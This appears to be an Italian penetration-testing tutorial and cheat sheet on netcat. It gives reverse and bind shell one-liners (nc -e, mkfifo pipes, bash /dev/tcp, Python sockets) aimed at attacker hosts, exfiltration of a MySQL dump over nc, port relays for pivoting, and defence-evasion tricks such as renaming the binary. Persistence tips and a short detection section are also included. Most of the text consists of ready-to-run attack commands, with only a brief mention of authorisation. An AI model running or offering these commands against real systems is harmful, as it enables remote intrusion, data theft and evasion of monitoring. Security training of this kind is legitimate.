---
title: 'NC: Swiss Army Knife delle Connessioni TCP/UDP'
slug: nc
description: 'NC è uno strumento versatile per connessioni TCP/UDP, port scanning, banner grabbing e reverse shell nel penetration testing autorizzato.'
image: /Gemini_Generated_Image_3jlglh3jlglh3jlg.webp
draft: true
date: 2026-02-19T00:00:00.000Z
categories:
  - networking
subcategories:
  - protocolli
tags:
  - netcat
  - nc
---

# NC: Il Coltellino Svizzero per Reverse Shell e Networking

NC è lo strumento fondamentale per qualsiasi penetration tester. Presente su quasi tutti i sistemi Unix/Linux e disponibile per Windows, permette di creare connessioni TCP/UDP arbitrarie, listener per reverse shell, trasferimento file e port scanning basilare. In questa guida impari a padroneggiare Netcat per ottenere shell, trasferire payload e costruire tunnel durante i tuoi assessment.

## Posizione nella Kill Chain

NC è il tool più versatile della toolchain offensiva, utilizzabile in quasi ogni fase:

| Fase           | Tool Precedente                                    | Netcat                   | Tool Successivo                                  |
| -------------- | -------------------------------------------------- | ------------------------ | ------------------------------------------------ |
| Recon          | [Nmap](https://hackita.it/articoli/nmap) port scan | → Banner grabbing        | → Service enum                                   |
| Initial Access | Exploit delivery                                   | → Reverse shell listener | → Shell stabilization                            |
| Execution      | Web shell                                          | → Bind shell             | → [LinPEAS](https://hackita.it/articoli/linpeas) |
| Exfiltration   | Data collection                                    | → File transfer          | → Offline analysis                               |
| Pivoting       | Host compromise                                    | → Port relay             | → Internal scan                                  |

## Installazione e Setup

### Linux (Kali/Ubuntu)

NC(netcat) è quasi sempre preinstallato. Esistono due versioni principali:

```bash
# Verifica quale versione hai
nc -h 2>&1 | head -1
```

Output versione tradizionale:

```
[v1.10-47]
```

Output versione OpenBSD:

```
usage: nc [-46cDdFhklNnrStUuvz] [-I length] ...
```

Installazione se mancante:

```bash
# Versione tradizionale (con -e)
sudo apt install netcat-traditional -y

# Versione OpenBSD
sudo apt install netcat-openbsd -y
```

### Windows

Scarica da repository affidabili o usa versione inclusa in Nmap:

```cmd
# Se hai Nmap installato
ncat --version
```

Oppure trasferisci il binario standalone nc.exe (\~60KB).

### Verifica Funzionamento

```bash
nc -lvnp 4444 &
nc localhost 4444
# Se si connette, funziona
```

## Uso Base

### Sintassi Fondamentale

```bash
nc [options] [host] [port]
```

### Parametri Essenziali

| Parametro | Funzione    | Uso Comune                        |
| --------- | ----------- | --------------------------------- |
| `-l`      | Listen mode | Listener per shell                |
| `-v`      | Verbose     | Debug connessioni                 |
| `-n`      | No DNS      | Velocizza, evita leak DNS         |
| `-p`      | Local port  | Specifica porta listener          |
| `-e`      | Execute     | Esegue comando (solo traditional) |
| `-u`      | UDP         | Connessioni UDP                   |
| `-w`      | Timeout     | Timeout secondi                   |
| `-z`      | Zero-I/O    | Port scanning                     |

### Connessione a Servizio

```bash
nc -nv 192.168.1.100 80
```

Output:

```
(UNKNOWN) [192.168.1.100] 80 (http) open
```

### Banner Grabbing

```bash
echo "HEAD / HTTP/1.1\r\nHost: target\r\n\r\n" | nc -nv 192.168.1.100 80
```

Output:

```
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
...
```

## Reverse Shell Techniques

### Reverse Shell Linux - Attaccante

Setup listener:

```bash
nc -lvnp 4444
```

Output:

```
listening on [any] 4444 ...
```

### Reverse Shell Linux - Target

Con [netcat](https://hackita.it/articoli/netcat) tradizionale (-e disponibile):

```bash
nc -e /bin/bash 192.168.1.50 4444
```

Senza -e (versione OpenBSD):

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.50 4444 > /tmp/f
```

### Reverse Shell Windows

```cmd
nc.exe -e cmd.exe 192.168.1.50 4444
```

### One-liner Alternatives (quando nc non ha -e)

Bash:

```bash
bash -i >& /dev/tcp/192.168.1.50/4444 0>&1
```

Python:

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.50",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

## Bind Shell Techniques

Il target espone la shell, l'attaccante si connette.

### Bind Shell - Target

```bash
nc -lvnp 4444 -e /bin/bash
```

### Bind Shell - Attaccante

```bash
nc -nv 192.168.1.100 4444
```

Utile quando il target non può fare connessioni outbound.

## File Transfer

### Metodo 1: Receiver Prima

Ricevente (chi riceve il file):

```bash
nc -lvnp 9999 > received_file
```

Mittente:

```bash
nc -nv 192.168.1.50 9999 < file_to_send
```

### Metodo 2: Sender Prima

Mittente (espone il file):

```bash
nc -lvnp 9999 < file_to_send
```

Ricevente:

```bash
nc -nv 192.168.1.100 9999 > received_file
```

### Transfer con Progress (usando pv)

```bash
pv file.tar.gz | nc -lvnp 9999
nc -nv target 9999 | pv > file.tar.gz
```

## Port Scanning

Netcat può fare scanning basilare:

```bash
nc -znv 192.168.1.100 20-100
```

Output:

```
(UNKNOWN) [192.168.1.100] 80 (http) open
(UNKNOWN) [192.168.1.100] 22 (ssh) open
```

Per scanning più avanzato, usa [Nmap](https://hackita.it/articoli/nmap).

## Scenari Pratici di Penetration Test

### Scenario 1: Initial Access via Web RCE

**Timeline stimata: 10 minuti**

Hai trovato RCE in applicazione web. Obiettivo: shell stabile.

```bash
# COMANDO: Setup listener (tua macchina)
nc -lvnp 443
```

## OUTPUT ATTESO

```
listening on [any] 443 ...
```

```bash
# COMANDO: Payload da iniettare nella RCE
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.50 443 >/tmp/f
```

## OUTPUT ATTESO

```
listening on [any] 443 ...
connect to [192.168.1.50] from (UNKNOWN) [10.10.10.50] 48234
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### COSA FARE SE FALLISCE

* **No connection**: Firewall egress. Prova porta 80, 53, o 8080.
* **Shell muore subito**: Processo parent termina. Usa `nohup` o backgrounding.
* **nc non disponibile**: Usa bash redirect `/dev/tcp` o altri linguaggi.

### Scenario 2: Pivoting con Port Relay

**Timeline stimata: 15 minuti**

Hai compromesso un host nella DMZ e devi raggiungere rete interna.

```bash
# COMANDO: Sulla macchina DMZ, crea relay
mkfifo /tmp/backpipe
nc -lvnp 8888 < /tmp/backpipe | nc 10.10.10.100 22 > /tmp/backpipe &
```

```bash
# COMANDO: Dalla tua macchina
ssh admin@dmz-host -p 8888
# In realtà ti connetti a 10.10.10.100:22
```

### Scenario 3: Exfiltrazione Database Dump

**Timeline stimata: 5 minuti**

```bash
# COMANDO: Listener per ricevere dump (attaccante)
nc -lvnp 9999 > db_dump.sql

# COMANDO: Sul target, dump e invio
mysqldump -u root database 2>/dev/null | nc 192.168.1.50 9999
```

### Scenario 4: UDP Shell per Bypass Firewall

Alcuni firewall ispezionano solo TCP:

```bash
# Listener UDP
nc -u -lvnp 53

# Target
nc -u -e /bin/bash 192.168.1.50 53
```

## Shell Stabilization Post-Netcat

La shell Netcat è "dumb" - niente tab completion, niente Ctrl+C safe. Stabilizza:

```bash
# Sul target dopo connessione
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z per background

# Sulla tua macchina
stty raw -echo; fg

# Sul target
export TERM=xterm
```

Ora hai shell interattiva completa.

## Defense Evasion

### Tecnica 1: Porta Comune

Usa porte che sembrano traffico legittimo:

```bash
nc -lvnp 80   # HTTP
nc -lvnp 443  # HTTPS
nc -lvnp 53   # DNS
```

### Tecnica 2: Rinomina Binario

```bash
cp /usr/bin/nc /tmp/systemd-helper
/tmp/systemd-helper -e /bin/bash attacker 4444
```

### Tecnica 3: Netcat-less Reverse Shell

Se nc è monitorato, usa alternative native:

```bash
# Bash
bash -i >& /dev/tcp/attacker/4444 0>&1

# Python
python -c 'import socket,subprocess;s=socket.socket();s.connect(("attacker",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
```

## Integration Matrix

| Netcat +                                                       | Risultato       | Esempio                     |
| -------------------------------------------------------------- | --------------- | --------------------------- |
| [Metasploit](https://hackita.it/articoli/metasploit-framework) | Upgrade shell   | nc shell → sessions -u      |
| [Socat](https://hackita.it/articoli/socat)                     | PTY completo    | nc trasporto, socat PTY     |
| [Chisel](https://hackita.it/articoli/chisel)                   | Tunnel avanzati | nc initial → chisel SOCKS   |
| [WinPEAS](https://hackita.it/articoli/winpeas)                 | Enum post-shell | nc shell → transfer winpeas |

## Confronto Varianti Netcat

| Feature       | nc traditional | nc OpenBSD | Ncat  | Socat |
| ------------- | -------------- | ---------- | ----- | ----- |
| `-e` execute  | ✓              | ✗          | ✓     | ✓     |
| SSL/TLS       | ✗              | ✗          | ✓     | ✓     |
| IPv6          | ✗              | ✓          | ✓     | ✓     |
| Proxy support | ✗              | ✓          | ✓     | ✓     |
| Disponibilità | Alta           | Alta       | Media | Bassa |

**Quando usare nc traditional**: serve `-e`, target Linux con versione old.

**Quando usare alternative**: serve SSL, proxy, o features avanzate.

## Detection e Countermeasures

### Cosa Cerca il Blue Team

* Processo `nc` o `netcat` in esecuzione
* Connessioni outbound su porte non standard
* Named pipe `/tmp/f` (indicator di nc senza -e)
* Pattern commandline `-e /bin/bash`

### IOCs

```bash
# Process monitoring
ps aux | grep -E "nc|netcat" | grep -v grep

# Connections
netstat -tupn | grep -E "nc|netcat"

# Named pipes
find /tmp -type p 2>/dev/null
```

## Troubleshooting

### "Connection refused"

Listener non attivo o porta sbagliata:

```bash
# Verifica listener
netstat -tulpn | grep 4444
```

### Shell muore immediatamente

Il parent process termina:

```bash
# Usa nohup
nohup nc -e /bin/bash attacker 4444 &

# Oppure disown
nc -e /bin/bash attacker 4444 &
disown
```

### "nc: invalid option -- 'e'"

Hai versione OpenBSD. Usa metodo named pipe:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker 4444 >/tmp/f
```

### Trasferimento file incompleto

Connessione chiusa prima del completamento:

```bash
# Aggiungi -q per attendere
nc -q 5 -lvnp 9999 > file
```

## Cheat Sheet Comandi

| Operazione               | Comando                                                                     |
| ------------------------ | --------------------------------------------------------------------------- |
| Listener base            | `nc -lvnp PORT`                                                             |
| Connessione              | `nc -nv HOST PORT`                                                          |
| Reverse shell (con -e)   | `nc -e /bin/bash HOST PORT`                                                 |
| Reverse shell (senza -e) | `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc HOST PORT >/tmp/f` |
| Bind shell               | `nc -lvnp PORT -e /bin/bash`                                                |
| File receive             | `nc -lvnp PORT > file`                                                      |
| File send                | `nc HOST PORT < file`                                                       |
| Port scan                | `nc -znv HOST START-END`                                                    |
| Banner grab              | `echo "HEAD / HTTP/1.1\r\n\r\n" \| nc HOST 80`                              |
| UDP mode                 | `nc -u -lvnp PORT`                                                          |

## FAQ

**Qual è la differenza tra nc e ncat?**

Ncat è la versione Nmap con SSL e features extra. Nc è più basilare ma più diffuso.

**Come faccio a sapere quale versione ho?**

`nc -h` mostra help. Se vedi `-e` tra le opzioni, hai traditional. Se no, hai OpenBSD.

**Netcat funziona attraverso NAT?**

Per reverse shell sì (il target si connette a te). Per bind shell no (devi raggiungere il target).

**Come evito che la shell muoia?**

Usa `nohup`, `disown`, o esegui da processo persistente come cron o systemd.

**È meglio nc o socat?**

Nc è più semplice e diffuso. Socat è più potente (PTY, SSL). Dipende dal contesto.

**Come trasferisco file binari senza corruzione?**

Nc trasferisce byte-per-byte, nessun problema. Assicurati solo che la connessione non si chiuda prima.

**È legale usare Netcat?**

Solo su sistemi autorizzati. Per penetration test professionali, [hackita.it/servizi](https://hackita.it/servizi).

***

*Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).*

**Risorse**: [Netcat Man Page](https://linux.die.net/man/1/nc) | [SANS Netcat Cheat Sheet](https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf)
